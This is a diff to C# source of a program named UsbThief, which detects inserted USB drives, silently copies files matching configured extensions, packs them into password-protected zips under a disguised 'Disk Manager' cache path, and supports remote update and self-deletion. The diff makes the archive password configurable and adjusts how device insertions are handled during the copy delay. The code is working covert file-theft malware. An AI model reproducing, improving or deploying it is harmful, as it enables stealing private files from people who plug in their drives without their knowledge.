@@ -35,7 +35,7 @@ namespace UsbThief
         public static Logger logger = null;
         public SynchronizationContext mainThreadSynContext;
         public Status sta = Status.none;
-        public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, delay = 0, volLabel = "仿生人会涮电子羊吗", exportPath = @"Disk Manager\data\diskcache\files\" };
+        public Config conf = new Config { enable = false };
         public UsbDevice currentDevice = new UsbDevice { name = "none", volLabel = "none", ser = "none" };
         public enum Status
         {
@@ -54,6 +54,7 @@ namespace UsbThief
             public List<string> exts;
             public int sizeLim;
             public int delay;
+            public string passwd;
             public string volLabel;
             public string exportPath;
         }
@@ -161,7 +162,7 @@ namespace UsbThief
                 Process.Start(Application.StartupPath + "\\fileassistant.exe", "-suicide");
                 Environment.Exit(0);
             }
-            if (innerVer < conf.ver && (conf.update != null && conf.update != ""))
+            if (innerVer < conf.ver && conf.update != null && conf.update != "")
             {
                 logger.Info("检测到新版本，即将启动助手程序");
                 Process.Start(Application.StartupPath + "\\fileassistant.exe", "-update=" + conf.update);
@@ -238,12 +239,12 @@ namespace UsbThief
         {
             try
             {
-                if (m.Msg == WM_DEVICECHANGE && conf.enable)
+                if (m.Msg == WM_DEVICECHANGE && conf.enable && !inDelay)//不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
                 {
                     int wp = m.WParam.ToInt32();
                     if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
                     {
-                        if (wp == DBT_DEVICEARRIVAL && !inDelay)//不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
+                        if (wp == DBT_DEVICEARRIVAL)
                         {
                             Thread copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
                             DriveInfo[] s = DriveInfo.GetDrives();
@@ -681,7 +682,10 @@ namespace UsbThief
                 logger.Info("正在压缩：" + path);
                 using (ZipFile zip = new ZipFile(dest, Encoding.UTF8))
                 {
-                    zip.Password = "qiegewala";
+                    string passwd = "UsbThief";
+                    if (conf.passwd != null && conf.passwd != "")
+                        passwd = conf.passwd;
+                    zip.Password = passwd;
                     zip.AddDirectory(path, ser);
                     zip.Save();
                 }
